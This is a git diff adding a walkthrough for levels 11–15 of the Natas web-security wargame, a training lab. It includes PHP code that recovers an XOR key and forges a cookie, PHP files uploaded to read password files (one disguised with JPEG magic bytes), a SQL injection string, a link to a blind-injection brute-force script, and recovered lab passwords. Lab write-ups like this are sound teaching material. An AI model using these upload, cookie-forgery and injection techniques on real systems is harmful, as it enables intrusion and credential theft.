@@ -68,24 +68,86 @@ Insert '.* /etc/natas_webpass/natas11 #'
 U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
 
 ### Level 11 → Level 12
+Get the xor encoder key using:
+```php
+ $text = json_encode(array("showpassword"=>"no", "bgcolor"=>"#ffffff"));
+ $encText = base64_decode('ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=');
+ 
+ $outText = '';
+ for($i=0;$i<strlen($text);$i++) {
+    $outText .= $text[$i] ^ $encText[$i % strlen($encText)];
+ }
+ print $outText;
+```
+-> key is 'qw8J'
+Now get the good cookie:
+```php
+ function xor_encrypt($in) {
+    $key = 'qw8J';
+    $text = $in;
+    $outText = '';
 
+    // Iterate through each character
+    for($i=0;$i<strlen($text);$i++) {
+    $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+ }
+ $d = array("showpassword"=>"yes", "bgcolor"=>"#ffffff");
+ print base64_encode(xor_encrypt(json_encode($d)));
+```
+-> ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
+set 'data' cookie to this cookie
 **password:**
+EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
 
-### Level 12 → Level 13
-
-**password:**
-
-### Level 13 → Level 14
-
-**password:**
+### Level 12 → Level 13  
+Create php file (a.php for example):
+```php
+<?php
+  echo file_get_contents('/etc/natas_webpass/natas13');
+?>
+```
+change the filename value html tag to 'a.php'
+-> <input type="hidden" name="filename" value="a.php">
+Upload file and click on the link
+**password:**  
+jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+  
+### Level 13 → Level 14  
+Create file start with JPEG magic number('FF D8 FF EE')
+```shell
+echo -e "\xff\xd8\xff\xe0" > a
+```
+Create php file('b') similar to level 12:
+```php
+<?php
+  echo file_get_contents('/etc/natas_webpass/natas14');
+?>
+```
+Merge the files
+```shell
+cat a b > c.php
+```
+Upload like previous level and click link
+**password:**  
+Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1  
 
 ### Level 14 → Level 15
-
+Simple SQL injection
+Username: natas15
+Password: " OR ""="
 **password:**
-
+AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J  
+  
 ### Level 15 → Level 16
-
-**password:**
+Basic Blind SQL injection, 64 char max password, we need to do 2 thing to get the password:  
+1. Get the character set (to reduce the complexity of the brute force)
+2. Brute force  
+Use [this](https://gist.github.com/bom2013/d3a3e83d165209de8164a41c0b74703a) python script to do it
+**password:**  
+WaIHEacj63wnNIBROHeqi3p9t0m5nhmh  
 
 ### Level 16 → Level 17
 
